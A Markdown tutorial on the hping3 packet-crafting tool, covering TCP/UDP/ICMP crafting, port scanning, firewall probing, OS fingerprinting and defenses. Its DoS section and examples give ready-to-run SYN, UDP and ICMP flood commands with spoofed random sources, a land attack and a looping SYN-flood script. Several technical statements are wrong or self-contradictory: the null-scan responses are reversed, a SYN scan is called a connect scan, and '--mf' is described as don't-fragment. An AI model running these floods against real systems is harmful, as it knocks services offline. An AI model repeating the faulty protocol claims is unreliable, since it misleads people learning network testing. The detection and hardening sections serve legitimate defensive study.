# HPING3: A Comprehensive Guide to Advanced Packet Crafting and Network Testing

## Table of Contents
1. [Introduction](#introduction)
2. [TCP/IP Packet Fundamentals](#tcpip-packet-fundamentals)
3. [How HPING3 Works](#how-hping3-works)
4. [Installation and Setup](#installation-and-setup)
5. [Basic Syntax and Usage](#basic-syntax-and-usage)
6. [Operational Modes](#operational-modes)
7. [Packet Crafting Fundamentals](#packet-crafting-fundamentals)
8. [TCP Packet Crafting](#tcp-packet-crafting)
9. [UDP Packet Crafting](#udp-packet-crafting)
10. [ICMP Packet Operations](#icmp-packet-operations)
11. [Firewall Testing Techniques](#firewall-testing-techniques)
12. [Port Scanning with hping3](#port-scanning-with-hping3)
13. [Denial-of-Service (DoS) Testing](#denial-of-service-dos-testing)
14. [Advanced Techniques](#advanced-techniques)
15. [Practical Examples and Workflows](#practical-examples-and-workflows)
16. [Detection and Defense](#detection-and-defense)
17. [Security and Ethical Considerations](#security-and-ethical-considerations)

---

## Introduction

**hping3** is a sophisticated command-line network tool that allows users to send custom ICMP, UDP, and TCP packets and display target replies like ping does with ICMP replies. It is an evolution of the original hping tool and provides advanced packet crafting capabilities for network testing, security auditing, and protocol analysis.

### Key Characteristics

- **Packet Crafting**: Customize every layer of TCP/IP packets
- **Multiple Protocols**: ICMP, UDP, TCP, and RAW IP support
- **Advanced Scanning**: Port scanning with custom TCP flags
- **Firewall Testing**: Probe firewall rules and behavior
- **Spoofing**: Randomize source IP and MAC addresses
- **Flooding**: Send packets at line speed
- **Traceroute**: Trace paths under different protocols
- **OS Fingerprinting**: Identify remote operating systems
- **File Transfer**: Transfer files under supported protocols
- **Programmable**: TCL (Tool Command Language) scripting support

### Primary Use Cases

- **Firewall Testing**: Probe firewall configurations with custom packets
- **Port Scanning**: Advanced port discovery beyond traditional scanning
- **Network Troubleshooting**: Manual path MTU discovery, latency analysis
- **Protocol Testing**: Test protocol implementations and edge cases
- **Security Assessment**: Identify weak network filtering
- **DoS Simulation**: Test network resilience (authorized only)
- **OS Fingerprinting**: Determine remote operating system
- **Intrusion Detection**: Test IDS/IPS detection capabilities
- **Network Performance**: Generate specific traffic patterns

### Limitations

- **Requires Root/Admin**: Needs elevated privileges for raw packet operations
- **Noisy**: Generates obvious reconnaissance patterns
- **Single-Threaded**: Slower than parallel scanning tools
- **No Service Detection**: Doesn't perform service/version detection
- **Easily Detected**: IDS/IPS systems recognize hping3 patterns
- **Not Stealth**: Obvious reconnaissance tool

---

## TCP/IP Packet Fundamentals

### OSI Model and Packet Structure

```
┌─────────────────────────────────────────┐
│ Layer 7: Application (Data)             │
├─────────────────────────────────────────┤
│ Layer 6: Presentation (Encryption/etc)  │
├─────────────────────────────────────────┤
│ Layer 5: Session (Session Management)   │
├─────────────────────────────────────────┤
│ Layer 4: Transport (TCP/UDP Header)     │  ← hping3 operates here
│                                          │     and below
│  TCP Header:                             │
│  ├─ Source Port (2 bytes)               │
│  ├─ Destination Port (2 bytes)          │
│  ├─ Sequence Number (4 bytes)           │
│  ├─ Acknowledgment (4 bytes)            │
│  ├─ Flags (SYN, ACK, FIN, RST, etc.)   │
│  ├─ Window Size (2 bytes)               │
│  ├─ Checksum (2 bytes)                  │
│  └─ Options (0-40 bytes)                │
├─────────────────────────────────────────┤
│ Layer 3: Network (IP Header)            │
│                                          │
│  IPv4 Header:                            │
│  ├─ Version/IHL (1 byte)                │
│  ├─ Type of Service (1 byte)            │
│  ├─ Total Length (2 bytes)              │
│  ├─ Identification (2 bytes)            │
│  ├─ Flags/Fragment Offset (2 bytes)     │
│  ├─ TTL (1 byte)                        │
│  ├─ Protocol (1 byte)                   │
│  ├─ Checksum (2 bytes)                  │
│  ├─ Source IP Address (4 bytes)         │
│  └─ Destination IP Address (4 bytes)    │
├─────────────────────────────────────────┤
│ Layer 2: Data Link (Ethernet)           │
│                                          │
│  Ethernet Frame:                         │
│  ├─ Destination MAC (6 bytes)           │
│  ├─ Source MAC (6 bytes)                │
│  ├─ Type (2 bytes)                      │
│  └─ CRC (4 bytes)                       │
├─────────────────────────────────────────┤
│ Layer 1: Physical (Bits on Wire)        │
└─────────────────────────────────────────┘
```

### TCP Flags (Control Bits)

hping3 can set individual TCP flags:

| Flag | Meaning | Use |
|------|---------|-----|
| **SYN** | Synchronize | Start connection (port scan) |
| **ACK** | Acknowledgment | Confirm receipt (response expected) |
| **FIN** | Finish | Close connection |
| **RST** | Reset | Abort connection |
| **PSH** | Push | Urgent data |
| **URG** | Urgent | Priority data |
| **NONE** | No flags | Null scan |
| **ALL** | All flags set | Xmas scan |

### TCP Handshake (3-Way)

```
Client                          Server
  │                              │
  ├─ SYN (seq=x) ───────────────>│
  │ (Client initiates, syn #=x)  │
  │                              │
  │<─ SYN-ACK (seq=y, ack=x+1) ──┤
  │ (Server responds, syn #=y,   │
  │  acknowledges client's x)    │
  │                              │
  ├─ ACK (seq=x+1, ack=y+1) ───>│
  │ (Client confirms, ack #=y+1) │
  │                              │
  └────── Connection Established─┘
```

---

## How HPING3 Works

### Basic Operation Model

```
┌─────────────────────────────────┐
│ User Input (Command Line)       │
│  hping3 -S -p 80 192.168.1.1   │
└────────────┬────────────────────┘
             │
             ▼
┌─────────────────────────────────┐
│ Parser & Validation             │
│ ├─ Parse flags (-S, -p)         │
│ ├─ Validate IP address          │
│ ├─ Resolve hostname (if needed) │
│ └─ Construct packet             │
└────────────┬────────────────────┘
             │
             ▼
┌─────────────────────────────────┐
│ Packet Crafting                 │
│ ├─ Create IP header             │
│ ├─ Create TCP/UDP/ICMP header   │
│ ├─ Add TCP flags (SYN, ACK, etc)│
│ ├─ Set source port/IP (spoofed?)│
│ ├─ Calculate checksums          │
│ └─ Add payload (if any)         │
└────────────┬────────────────────┘
             │
             ▼
┌─────────────────────────────────┐
│ Raw Socket Transmission         │
│ ├─ Create raw socket            │
│ ├─ Bind to network interface    │
│ ├─ Send packet via libpcap      │
│ └─ Repeat based on count/flood  │
└────────────┬────────────────────┘
             │
             ▼
┌─────────────────────────────────┐
│ Packet Reception & Capture      │
│ ├─ Listen on same interface     │
│ ├─ Capture responses            │
│ └─ Filter (optional)            │
└────────────┬────────────────────┘
             │
             ▼
┌─────────────────────────────────┐
│ Response Analysis               │
│ ├─ Decode response packet       │
│ ├─ Compare with sent packet     │
│ ├─ Infer port status            │
│ ├─ Display to user              │
│ └─ Log (optional)               │
└─────────────────────────────────┘
```

### Scanning Methods

**Port Status Inference from Responses:**

```
Sent Packet: SYN (flags=SYN)
  │
  ├─ Response: SYN-ACK (flags=SYN,ACK)
  │  → Port is OPEN
  │
  ├─ Response: RST (flags=RST)
  │  → Port is CLOSED
  │
  ├─ Response: (No response after timeout)
  │  → Port is FILTERED (firewall blocking)
  │
  └─ Response: ICMP Port Unreachable
     → Port is FILTERED or host down
```

---

## Installation and Setup

### Linux Installation

**Kali Linux** (Pre-installed):

```bash
hping3 --version
```

**Ubuntu/Debian**:

```bash
sudo apt update
sudo apt install hping3
```

**Fedora/RHEL/CentOS**:

```bash
sudo dnf install hping3
```

**Arch Linux**:

```bash
sudo pacman -S hping3
```

### macOS Installation

```bash
brew install hping3
```

### From Source

```bash
# Download source
wget http://www.hping.org/hping3-20051105.tar.gz
tar xzf hping3-20051105.tar.gz
cd hping3-20051105

# Compile
./configure
make
sudo make install
```

### Verification

```bash
# Check version
hping3 --version

# Display help
hping3 --help

# Check if running with proper privileges
sudo hping3 -h 127.0.0.1 --help
```

---

## Basic Syntax and Usage

### General Command Structure

```bash
hping3 [mode] [options] [target]
```

### Modes

| Mode | Flag | Default | Purpose |
|------|------|---------|---------|
| TCP | `-0` | DEFAULT | Send TCP packets |
| ICMP | `-1` | | Send ICMP packets (ping) |
| UDP | `-2` | | Send UDP packets |
| RAW IP | `-3` | | Raw IP mode |
| Scan | `--scan` | | Scan mode (scan ports) |
| Listen | `-9` | | Listen mode (receive packets) |

### Common Options

| Option | Purpose | Example |
|--------|---------|---------|
| `-c count` | Number of packets | `hping3 -c 5 192.168.1.1` |
| `-p port` | Destination port | `hping3 -p 80 192.168.1.1` |
| `-S` | Set SYN flag | `hping3 -S 192.168.1.1` |
| `-A` | Set ACK flag | `hping3 -A 192.168.1.1` |
| `-F` | Set FIN flag | `hping3 -F 192.168.1.1` |
| `-R` | Set RST flag | `hping3 -R 192.168.1.1` |
| `-P` | Set PSH flag | `hping3 -P 192.168.1.1` |
| `-U` | Set URG flag | `hping3 -U 192.168.1.1` |
| `-d size` | Payload size | `hping3 -d 256 192.168.1.1` |
| `-i interval` | Interval between packets | `hping3 -i u100 192.168.1.1` |
| `--flood` | Send as fast as possible | `hping3 --flood 192.168.1.1` |
| `--rand-source` | Random source IP | `hping3 --rand-source 192.168.1.1` |
| `-I interface` | Network interface | `hping3 -I eth0 192.168.1.1` |
| `-t ttl` | TTL value | `hping3 -t 64 192.168.1.1` |
| `-w window` | Window size | `hping3 -w 5840 192.168.1.1` |
| `--keep` | Keep source port fixed | `hping3 --keep -p 1234 192.168.1.1` |
| `-Q` | Display sequence numbers | `hping3 -Q -p 80 192.168.1.1` |

---

## Operational Modes

### 1. TCP Mode (Default)

```bash
# Simple TCP ping on port 80
hping3 -p 80 192.168.1.1

# With SYN flag
hping3 -S -p 80 192.168.1.1

# Multiple packets
hping3 -S -p 80 -c 5 192.168.1.1
```

### 2. UDP Mode (-2)

```bash
# Send UDP packet to port 53 (DNS)
hping3 -2 -p 53 192.168.1.1

# With custom payload
hping3 -2 -p 53 -d 100 192.168.1.1

# Multiple UDP packets
hping3 -2 -p 53 -c 10 192.168.1.1
```

### 3. ICMP Mode (-1)

```bash
# ICMP echo request (ping)
hping3 -1 192.168.1.1

# With custom packet size
hping3 -1 -d 256 192.168.1.1

# ICMP echo reply
hping3 -1 -A 192.168.1.1
```

### 4. RAW IP Mode (-3)

```bash
# Send raw IP packets
hping3 -3 192.168.1.1

# With specific protocol
hping3 -3 -P TCP 192.168.1.1
```

### 5. Scan Mode (--scan)

```bash
# Scan port range with SYN
hping3 --scan 1-1000 -S 192.168.1.1

# Scan with service names
hping3 --scan 1-65535 -S 192.168.1.1

# Named ports
hping3 --scan "http,ftp,ssh,smtp,dns" -S 192.168.1.1
```

### 6. Listen Mode (-9)

```bash
# Listen for incoming packets
hping3 -9 TCP -I eth0

# Listen on specific port
hping3 -9 TCP:80 -I eth0

# Listen on all ports
hping3 -9 IP -I eth0
```

---

## Packet Crafting Fundamentals

### Setting TCP Flags

**Individual Flags**:

```bash
# SYN packet
hping3 -S 192.168.1.1

# ACK packet
hping3 -A 192.168.1.1

# FIN packet
hping3 -F 192.168.1.1

# RST packet
hping3 -R 192.168.1.1

# PSH packet
hping3 -P 192.168.1.1

# URG packet
hping3 -U 192.168.1.1
```

**Multiple Flags**:

```bash
# SYN + ACK
hping3 -A -S 192.168.1.1

# FIN + PSH + URG (Xmas scan)
hping3 -F -P -U 192.168.1.1

# All flags
hping3 -A -F -P -R -S -U 192.168.1.1

# No flags (Null scan)
hping3 192.168.1.1
```

### Setting IP Options

**TTL (Time To Live)**:

```bash
# Set TTL to 1 (hop count)
hping3 -t 1 192.168.1.1

# TTL 64 (typical for Linux)
hping3 -t 64 192.168.1.1

# TTL 128 (typical for Windows)
hping3 -t 128 192.168.1.1
```

**Fragment Offset**:

```bash
# Send fragmented packets
hping3 -f 192.168.1.1

# Specific fragment offset
hping3 --frag 192.168.1.1
```

**Type of Service (ToS)**:

```bash
# Minimize latency
hping3 -B 16 192.168.1.1

# Maximize throughput
hping3 -B 8 192.168.1.1

# Maximize reliability
hping3 -B 4 192.168.1.1
```

### Payload Customization

**Adding Payload**:

```bash
# String payload
hping3 -p 80 -d 256 192.168.1.1

# Specific hex data
hping3 -p 80 -E "Hello World" 192.168.1.1

# Random payload
hping3 -p 80 -d 1000 --rand-data 192.168.1.1
```

---

## TCP Packet Crafting

### Port Scanning

**SYN Scan** (Connect scan equivalent):

```bash
# Scan single port
hping3 -S -p 80 192.168.1.1

# Multiple packets to same port
hping3 -S -p 80 -c 3 192.168.1.1

# Port range (slow)
for port in 80 443 22 21 25; do
    hping3 -S -p $port 192.168.1.1
done
```

**Null Scan** (No flags):

```bash
# Send packet with no flags
hping3 -p 80 192.168.1.1

# Expected: No response (closed) or RST (open)
```

**FIN Scan**:

```bash
# FIN flag only
hping3 -F -p 80 192.168.1.1

# Expected: RST if closed, no response if open
```

**Xmas Scan** (All flags):

```bash
# Set FIN, PSH, URG
hping3 -F -P -U -p 80 192.168.1.1
```

### Sequence Number Analysis

```bash
# Display sequence numbers (-Q)
hping3 -Q -p 80 -c 5 192.168.1.1

# Output shows sequence prediction capability
# Useful for TCP/IP stack fingerprinting
```

### Window Size Analysis

```bash
# Display window size
hping3 -S -p 80 -c 3 -w 5840 192.168.1.1

# Window size helps identify OS
```

---

## UDP Packet Crafting

### Basic UDP Packets

```bash
# Send UDP to port 53 (DNS)
sudo hping3 -2 -p 53 192.168.1.1

# With 500 bytes payload
sudo hping3 -2 -p 53 -d 500 192.168.1.1

# Multiple UDP packets
sudo hping3 -2 -p 53 -c 10 192.168.1.1
```

### UDP Flood

```bash
# Continuous UDP flood
sudo hping3 -2 -p 53 --flood 192.168.1.1

# With random source
sudo hping3 -2 -p 53 --flood --rand-source 192.168.1.1

# With specific payload size
sudo hping3 -2 -p 53 -d 1000 --flood 192.168.1.1
```

### UDP Scanning

```bash
# Scan UDP ports
hping3 -2 --scan 1-1000 192.168.1.1

# Filter for open ports
# (no response = filtered, ICMP = closed)
```

---

## ICMP Packet Operations

### ICMP Echo (Ping)

```bash
# Basic ICMP echo request
hping3 -1 192.168.1.1

# With custom payload size
hping3 -1 -d 1000 192.168.1.1

# Multiple ICMP requests
hping3 -1 -c 5 192.168.1.1

# With specific interval
hping3 -1 -i u100 192.168.1.1    # 100 microseconds between packets
```

### ICMP Timestamp

```bash
# ICMP Timestamp request
hping3 -1 --icmp-ts 192.168.1.1

# Useful for OS fingerprinting
```

### ICMP Redirect

```bash
# Send ICMP redirect
hping3 -1 -C REDIRECT --gw 192.168.1.254 192.168.1.1
```

---

## Firewall Testing Techniques

### Basic Firewall Probing

**Test if ICMP is allowed:**

```bash
# ICMP echo
sudo hping3 -1 192.168.1.1

# If no response = ICMP blocked
```

**Test if specific ports open:**

```bash
# Port 22 (SSH)
sudo hping3 -S -p 22 192.168.1.1

# Port 80 (HTTP)
sudo hping3 -S -p 80 192.168.1.1

# Port 443 (HTTPS)
sudo hping3 -S -p 443 192.168.1.1
```

**Test TCP flags:**

```bash
# SYN
sudo hping3 -S -p 80 192.168.1.1

# FIN
sudo hping3 -F -p 80 192.168.1.1

# All flags (Xmas)
sudo hping3 -F -P -U -p 80 192.168.1.1
```

### Firewall Rule Detection

**Stateful inspection detection:**

```bash
# Send unsolicited ACK (should be dropped)
sudo hping3 -A -p 80 192.168.1.1

# No response = stateful firewall
# Response (RST) = stateless firewall
```

**MTU Discovery**:

```bash
# Don't fragment flag with various sizes
sudo hping3 --mf -d 1400 -p 80 192.168.1.1
sudo hping3 --mf -d 1401 -p 80 192.168.1.1
sudo hping3 --mf -d 1500 -p 80 192.168.1.1

# Find maximum MTU path allows
```

### Firewall Evasion Attempts

**Fragmentation**:

```bash
# Send fragmented packets
sudo hping3 -f -d 100 -p 80 192.168.1.1

# Some firewalls don't inspect fragments
```

**Anomalous Headers**:

```bash
# Extra-large window
sudo hping3 -S -w 65535 -p 80 192.168.1.1

# Invalid flags
sudo hping3 --baseoff 192.168.1.1
```

---

## Port Scanning with hping3

### Simple Port Scan

**Single Port**:

```bash
# Scan port 80
sudo hping3 -S -p 80 192.168.1.1
```

**Port Range** (Slow):

```bash
# Scan ports 1-1000
sudo hping3 --scan 1-1000 -S 192.168.1.1

# Scan named ports
sudo hping3 --scan "http,ftp,ssh,smtp" -S 192.168.1.1
```

**Bash Script for Scanning**:

```bash
#!/bin/bash
# hping3 port scanner

TARGET=$1
START=${2:-1}
END=${3:-65535}

for port in $(seq $START $END); do
    echo -n "Port $port: "
    sudo hping3 -S -p $port -c 1 $TARGET | grep -q "flags=SA"
    if [ $? -eq 0 ]; then
        echo "OPEN"
    else
        echo "closed"
    fi
done
```

### OS Fingerprinting

```bash
# TTL analysis
sudo hping3 -t 64 -p 80 192.168.1.1   # Linux/Unix
sudo hping3 -t 128 -p 80 192.168.1.1  # Windows

# Window size analysis
sudo hping3 -S -p 80 -c 3 192.168.1.1 | grep "win="

# Sequence number analysis
sudo hping3 -S -p 80 -Q -c 5 192.168.1.1 | grep "seq="
```

---

## Denial-of-Service (DoS) Testing

### TCP SYN Flood

**Basic SYN Flood**:

```bash
# Send continuous SYN packets
sudo hping3 -S --flood -p 80 192.168.1.1

# Stop with Ctrl+C
```

**With Spoofed Source IPs**:

```bash
# Random source IPs (harder to trace)
sudo hping3 -S --flood --rand-source -p 80 192.168.1.1
```

**Complete SYN Flood Example**:

```bash
# hping3 -c 15000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.1.1
# -c 15000       = Send 15000 packets
# -d 120         = 120 bytes payload
# -S             = SYN flag
# -w 64          = Window size 64
# -p 80          = Port 80
# --flood        = Maximum speed
# --rand-source  = Spoof source IP
```

### UDP Flood

```bash
# UDP flood on port 53 (DNS)
sudo hping3 -2 --flood --rand-source -p 53 192.168.1.1

# UDP flood on port 123 (NTP)
sudo hping3 -2 --flood --rand-source -p 123 192.168.1.1
```

### ICMP Flood (Ping Flood)

```bash
# ICMP echo flood
sudo hping3 -1 --flood -d 1000 192.168.1.1

# With random source
sudo hping3 -1 --flood --rand-source -d 1000 192.168.1.1
```

### Land Attack

```bash
# Send packet with same source and destination
sudo hping3 -S -p 80 --spoof 192.168.1.1 192.168.1.1

# Can freeze target (older systems)
```

---

## Advanced Techniques

### Traceroute

**ICMP Traceroute**:

```bash
# Trace path using ICMP
hping3 -1 --traceroute 192.168.1.1

# Shows each hop's response
```

**TCP Traceroute**:

```bash
# Trace using TCP (port 80)
sudo hping3 -S -p 80 --traceroute 192.168.1.1
```

### IP Spoofing

**Spoof Source IP**:

```bash
# Send from fake IP
sudo hping3 --spoof 192.168.100.1 -S -p 80 192.168.1.1

# Verify spoofing with tcpdump
sudo tcpdump -i eth0 -n 'src 192.168.100.1'
```

### Packet Analysis with Timing

**TTL-Based Path Discovery**:

```bash
# Increment TTL to find path
for ttl in 1 2 3 4 5 6 7 8; do
    sudo hping3 -t $ttl -S -p 80 192.168.1.1
done
```

### Fragmentation Tests

**Fragment Handling**:

```bash
# Send fragments
sudo hping3 -f -d 1000 -p 80 192.168.1.1

# Test Fragment Offset
sudo hping3 --frag --baseoff 192.168.1.1
```

---

## Practical Examples and Workflows

### Example 1: Port Scan Network Range

```bash
#!/bin/bash
# Scan multiple hosts and ports

NETWORK="192.168.1"
PORTS="22 80 443 3306"

for host in {1..254}; do
    IP="$NETWORK.$host"
    echo "Scanning $IP..."
    
    for port in $PORTS; do
        timeout 1 sudo hping3 -S -p $port -c 1 $IP 2>/dev/null | grep -q "flags=SA"
        if [ $? -eq 0 ]; then
            echo "  ✓ Port $port OPEN"
        fi
    done
done
```

### Example 2: Firewall Rule Discovery

```bash
#!/bin/bash
# Discover firewall filtering

TARGET="192.168.1.1"

echo "Testing ICMP..."
sudo hping3 -1 -c 1 $TARGET
echo ""

echo "Testing SYN packets on various ports..."
for port in 22 25 53 80 443 3306 3389; do
    echo -n "Port $port: "
    sudo hping3 -S -p $port -c 1 $TARGET 2>/dev/null | grep -q "flags=SA" && echo "OPEN" || echo "BLOCKED"
done
```

### Example 3: OS Fingerprinting

```bash
#!/bin/bash
# Simple OS detection based on TTL

TARGET=$1

echo "TTL Analysis for $TARGET"
echo ""

echo "Testing TTL 64 (Linux/Unix):"
sudo hping3 -t 64 -S -p 80 -c 1 $TARGET 2>/dev/null

echo ""
echo "Testing TTL 128 (Windows):"
sudo hping3 -t 128 -S -p 80 -c 1 $TARGET 2>/dev/null

echo ""
echo "Testing TTL 255 (Networking devices):"
sudo hping3 -t 255 -S -p 80 -c 1 $TARGET 2>/dev/null
```

### Example 4: Authorized DoS Testing

```bash
#!/bin/bash
# CONTROLLED and AUTHORIZED DoS test
# ONLY on systems you own or have explicit permission to test

TARGET=$1
PORT=${2:-80}
DURATION=${3:-10}

echo "WARNING: DoS testing starting in 3 seconds..."
echo "Target: $TARGET:$PORT"
echo "Duration: $DURATION seconds"
sleep 3

END=$((SECONDS + DURATION))

echo "Starting SYN flood..."
while [ $SECONDS -lt $END ]; do
    sudo hping3 -S --flood -p $PORT $TARGET &
    sleep 1
    pkill -f "hping3 -S --flood"
done

echo "DoS testing complete"
```

---

## Detection and Defense

### Detecting hping3 Attacks

**Network Level**:

```bash
# Monitor with tcpdump
sudo tcpdump -i eth0 'tcp[tcpflags] & tcp-syn != 0'

# Filter for suspicious patterns
sudo tcpdump -i eth0 'src 192.168.1.0/24 and tcp[tcpflags] & tcp-syn != 0'
```

**Wireshark Filters**:

```
# SYN packets from random sources
tcp.flags.syn == 1 and tcp.flags.ack == 0

# High-rate SYN packets (flood)
tcp.flags.syn == 1 and frame.len < 100

# Anomalous combinations
tcp.flags.fin == 1 and tcp.flags.psh == 1 and tcp.flags.urg == 1
```

**Linux Sysctl Monitoring**:

```bash
# Monitor SYN flood impact
watch -n 1 'netstat -an | grep SYN_RECV | wc -l'

# Check TCP statistics
cat /proc/net/netstat | grep Tcp
```

### Defense Mechanisms

**Firewall Rules**:

```bash
# Block suspicious flag combinations
iptables -A INPUT -p tcp --tcp-flags FPU FPU -j DROP
iptables -A INPUT -p tcp --tcp-flags SYN,RST SYN,RST -j DROP

# Limit SYN packets
iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 5 -j ACCEPT
iptables -A INPUT -p tcp --syn -j DROP
```

**Rate Limiting**:

```bash
# Using tc (traffic control)
sudo tc qdisc add dev eth0 root tbf rate 1mbit burst 32kbit latency 400ms
```

**SYN Cookies**:

```bash
# Enable on Linux
sudo sysctl -w net.ipv4.tcp_syncookies=1

# Make persistent
echo "net.ipv4.tcp_syncookies=1" | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

---

## Security and Ethical Considerations

### Legal Implications

**hping3 is a Dangerous Tool**:

- ✗ Unauthorized DoS attacks are **felonies** (Computer Fraud and Abuse Act - CFAA)
- ✗ Port scanning without permission may violate terms of service
- ✗ IP spoofing is illegal in many jurisdictions
- ✗ Unauthorized firewall testing is illegal

**Legal Use Cases**:

- ✓ **Authorized Testing**: Written approval for specific systems
- ✓ **Lab Environments**: Your own equipment
- ✓ **Bug Bounty Programs**: Within program scope
- ✓ **Security Research**: Academic/approved research
- ✓ **Professional Services**: As part of contracted security assessment

### Responsible Use

1. **Get Written Authorization**: Signed scope of work
2. **Limit Scope**: Only test approved systems/networks
3. **Avoid Production Impact**: Schedule tests during maintenance windows
4. **Document Everything**: Keep detailed logs
5. **Report Findings**: Provide professional incident report
6. **Respect Limits**: Don't exceed authorized testing
7. **Secure Data**: Protect test results

### hping3 Detection Indicators

Attackers using hping3:

- **Unusual TCP flag combinations** (Xmas scan, Null scan)
- **Rapid SYN packets** to multiple ports
- **Spoofed source IPs** from same subnet
- **Fragmented packets** with suspicious payloads
- **High-speed scanning** patterns
- **Traceroute-like activity** with specific TTLs

### Network Monitoring for hping3

```bash
# Monitor for SYN floods
sudo tcpdump 'tcp[tcpflags] & tcp-syn != 0' | \
  awk '{print $3}' | cut -d. -f1-3 | sort | uniq -c | sort -rn

# Check for suspicious scanning patterns
sudo zeek -i eth0    # IDS with hping3 detection

# Monitor connection states
sudo netstat -an | grep LISTEN
```

---

## Summary and Best Practices

### Key Capabilities

1. **Custom Packet Crafting**: Full control over TCP/IP headers
2. **Port Scanning**: Advanced alternatives to traditional scanning
3. **Firewall Testing**: Probe and understand firewall behavior
4. **DoS Simulation**: Test network resilience (authorized only)
5. **OS Fingerprinting**: Identify remote systems
6. **Protocol Analysis**: Manual protocol testing
7. **Path Tracing**: Traceroute under different protocols
8. **Spoofing**: Source IP/MAC manipulation

### Best Practices

1. **Get Authorization**: Always get written permission
2. **Use in Lab**: Practice extensively in test environment
3. **Understand Protocols**: Know TCP/IP fundamentals
4. **Monitor Firewall**: Test response to various packets
5. **Document Findings**: Keep detailed records
6. **Avoid Chaos**: Don't overwhelm network
7. **Clean Up**: Document all testing activity
8. **Report Professionally**: Comprehensive assessment report

### When hping3 is Appropriate

✓ **Legitimate Uses:**
- Authorized firewall testing
- Protocol learning in lab
- Security assessment (with permission)
- Troubleshooting network issues
- Firewall rule validation
- Intrusion detection testing

✗ **Inappropriate Uses:**
- Unauthorized network access
- Denial-of-service attacks
- Reconnaissance without permission
- Network disruption
- Criminal activity

### Typical Security Assessment Workflow

```
1. Reconnaissance Phase
   └─ Identify live hosts with ping

2. Port Discovery
   └─ Scan ports with SYN scan

3. Firewall Testing
   └─ Probe firewall with custom packets

4. Protocol Analysis
   └─ Test service responses

5. Vulnerability Identification
   └─ Find weak configurations

6. DoS Resilience Testing (if authorized)
   └─ Limited flood testing

7. Documentation
   └─ Detailed findings report

8. Remediation
   └─ Recommend fixes
```

### Next Steps

- Practice packet crafting in lab environment
- Learn TCP/IP protocol deeply
- Understand firewall rules and behavior
- Get certified in ethical hacking
- Practice authorized penetration testing
- Develop custom scripts for testing
- Document all activities professionally
- Follow responsible disclosure practices
